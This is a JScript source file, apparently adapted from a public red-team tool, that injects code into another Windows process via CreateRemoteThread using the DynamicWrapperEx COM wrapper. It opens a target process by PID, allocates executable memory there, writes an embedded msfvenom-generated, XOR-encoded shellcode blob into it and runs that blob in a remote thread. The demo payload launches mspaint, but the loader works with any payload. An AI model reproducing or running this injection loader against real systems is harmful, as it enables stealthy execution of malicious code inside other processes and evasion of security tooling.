// CreateRemoteThread Process Injection by using DynamicWrapperEx
// https://github.com/ctxis/DynamicWrapperEx
//
// modified by: millers-crossing
// PS> cscript.exe CreateRemoteThread.js DLL_DIRECTORY TARGET_PID

var manifestXML = '<?xml version="1.0" encoding="UTF-16" standalone="yes"?><assembly xmlns="urn:schemas-microsoft-com:asm.v1" manifestVersion="1.0"><assemblyIdentity type="win32" name="COM" version="1.0.0.0"/> <file name="DynamicWrapperEx.dll"> <comClass description="DynamicWrapperEx" clsid="{1E2F6CDD-E721-4E94-885C-36C95D6A8CC2}" threadingModel="Both" progid="DynamicWrapperEx"/></file></assembly>'
 
var s = new ActiveXObject('WScript.Shell')
s.Environment('Process')('TMP') = WScript.arguments(0);
 
var actCtx = new ActiveXObject("Microsoft.Windows.ActCtx");
actCtx.ManifestText = manifestXML;

//-------------------------------------------------------------------------------------------------
// Method registration
//-------------------------------------------------------------------------------------------------
var dwx = actCtx.CreateObject("DynamicWrapperEx");
try {
	dwx.DwRegister("kernel32.dll", "VirtualAlloc");
    dwx.DwRegister("kernel32.dll", "VirtualAllocEx");
	dwx.DwRegister("kernel32.dll", "WriteProcessMemory");
    dwx.DwRegister("kernel32.dll", "CreateRemoteThread");
    dwx.DwRegister("kernel32.dll", "WaitForSingleObject");
	dwx.DwRegister("kernel32.dll", "OpenProcess");
	dwx.DwRegister("kernel32.dll", "GetLastError");
} catch (e) {
    WScript.Echo(e.message)
}

//-------------------------------------------------------------------------------------------------
// CreateRemoteThread Process injection
//-------------------------------------------------------------------------------------------------
var commit = 0x00003000; /* MEM_COMMIT | MEM_RESERVE */
var guard = 0x40; /*PAGE_EXECUTE_READWRITE*/
var PROCESS_ALL_ACCESS = 0x1f0fff;

var pid = 1*WScript.arguments(1);
WScript.Echo("[*] Target pid: ", pid);
var hProc = dwx.OpenProcess(PROCESS_ALL_ACCESS, 0, pid);
if (hProc == 0) {
	WScript.Echo("[-] Failed to OpenProcess: ", dwx.GetLastError());
    WScript.Quit();
}
WScript.Echo("[+] OpenProcess is successful: ", hProc);

//msfvenom -p windows/x64/exec cmd=mspaint.exe EXITFUNC=thread -f raw -e x64/xor -o mspaint.raw
//hexdump -v -e '"0""x" 1/1 "%02x" ", "' mspaint.raw
var shellcode = [
	0x48, 0x31, 0xc9, 0x48, 0x81, 0xe9, 0xdd, 0xff, 0xff, 0xff, 0x48, 0x8d, 0x05, 0xef, 0xff, 0xff, 0xff, 0x48, 0xbb, 0x04, 0xea, 0xe3, 0xb5, 0x19, 0x51, 0x87, 0x15, 0x48, 0x31, 0x58, 0x27, 0x48, 0x2d, 0xf8, 0xff, 0xff, 0xff, 0xe2, 0xf4, 0xf8, 0xa2, 0x60, 0x51, 0xe9, 0xb9, 0x47, 0x15, 0x04, 0xea, 0xa2, 0xe4, 0x58, 0x01, 0xd5, 0x44, 0x52, 0xa2, 0xd2, 0x67, 0x7c, 0x19, 0x0c, 0x47, 0x64, 0xa2, 0x68, 0xe7, 0x01, 0x19, 0x0c, 0x47, 0x24, 0xa2, 0x68, 0xc7, 0x49, 0x19, 0x88, 0xa2, 0x4e, 0xa0, 0xae, 0x84, 0xd0, 0x19, 0xb6, 0xd5, 0xa8, 0xd6, 0x82, 0xc9, 0x1b, 0x7d, 0xa7, 0x54, 0xc5, 0x23, 0xee, 0xf4, 0x18, 0x90, 0x65, 0xf8, 0x56, 0xab, 0xb2, 0xfd, 0x92, 0x03, 0xa7, 0x9e, 0x46, 0xd6, 0xab, 0xb4, 0xc9, 0xda, 0x07, 0x9d, 0x04, 0xea, 0xe3, 0xfd, 0x9c, 0x91, 0xf3, 0x72, 0x4c, 0xeb, 0x33, 0xe5, 0x92, 0x19, 0x9f, 0x51, 0x8f, 0xaa, 0xc3, 0xfc, 0x18, 0x81, 0x64, 0x43, 0x4c, 0x15, 0x2a, 0xf4, 0x92, 0x65, 0x0f, 0x5d, 0x05, 0x3c, 0xae, 0x84, 0xd0, 0x19, 0xb6, 0xd5, 0xa8, 0xab, 0x22, 0x7c, 0x14, 0x10, 0x86, 0xd4, 0x3c, 0x0a, 0x96, 0x44, 0x55, 0x52, 0xcb, 0x31, 0x0c, 0xaf, 0xda, 0x64, 0x6c, 0x89, 0xdf, 0x51, 0x8f, 0xaa, 0xc7, 0xfc, 0x18, 0x81, 0xe1, 0x54, 0x8f, 0xe6, 0xab, 0xf1, 0x92, 0x11, 0x9b, 0x5c, 0x05, 0x3a, 0xa2, 0x3e, 0x1d, 0xd9, 0xcf, 0x14, 0xd4, 0xab, 0xbb, 0xf4, 0x41, 0x0f, 0xde, 0x4f, 0x45, 0xb2, 0xa2, 0xec, 0x58, 0x0b, 0xcf, 0x96, 0xe8, 0xca, 0xa2, 0xe7, 0xe6, 0xb1, 0xdf, 0x54, 0x5d, 0xb0, 0xab, 0x3e, 0x0b, 0xb8, 0xd0, 0xea, 0xfb, 0x15, 0xbe, 0xfd, 0xa3, 0x50, 0x87, 0x15, 0x04, 0xea, 0xe3, 0xb5, 0x19, 0x19, 0x0a, 0x98, 0x05, 0xeb, 0xe3, 0xb5, 0x58, 0xeb, 0xb6, 0x9e, 0x6b, 0x6d, 0x1c, 0x60, 0xa2, 0xb1, 0x9a, 0x3f, 0x0e, 0xab, 0x59, 0x13, 0x8c, 0xec, 0x1a, 0xea, 0xd1, 0xa2, 0x60, 0x71, 0x31, 0x6d, 0x81, 0x69, 0x0e, 0x6a, 0x18, 0x55, 0x6c, 0x54, 0x3c, 0x52, 0x17, 0x98, 0x8c, 0xdf, 0x19, 0x08, 0xc6, 0x9c, 0xde, 0x15, 0x36, 0xd8, 0x6a, 0x21, 0xe6, 0x7c, 0x6a, 0x9e, 0xcd, 0xd0, 0x61, 0x34, 0x87, 0x15
];

var lpAddress = dwx.VirtualAlloc(0, shellcode.length, commit, guard);
if (lpAddress == 0) {
    WScript.Quit();
}

WScript.Echo("[*] shellcode.length: ", shellcode.length);

for (var i = 0; i < shellcode.length; ++i) {
    dwx.WriteByte(shellcode[i], lpAddress, i);
}

var  lpRemoteAddress = dwx.VirtualAllocEx(hProc, null, shellcode.length, commit, guard);
if (lpRemoteAddress == 0) {
	WScript.Echo("[-] Failed to VirtualAllocEx: ", dwx.GetLastError());
    WScript.Quit();
}
WScript.Echo("[+] lpRemoteAddress:", lpRemoteAddress);

var success = dwx.WriteProcessMemory(hProc, lpRemoteAddress, lpAddress, shellcode.length, null);
 if (lpAddress == 0) {
	WScript.Echo("[-] Failed to WriteProcessMemory: ", dwx.GetLastError());
    WScript.Quit();
} 

var hThread = dwx.CreateRemoteThread(hProc, null, 0, lpRemoteAddress, null, 0, null);
if (hThread == 0) {
	WScript.Echo("[-] Failed to CreateRemoteThread: ", dwx.GetLastError());
    WScript.Quit();
} 
WScript.Echo("[+] Remote Thread is created: ", hThread);
dwx.WaitForSingleObject(hThread, 5000); 
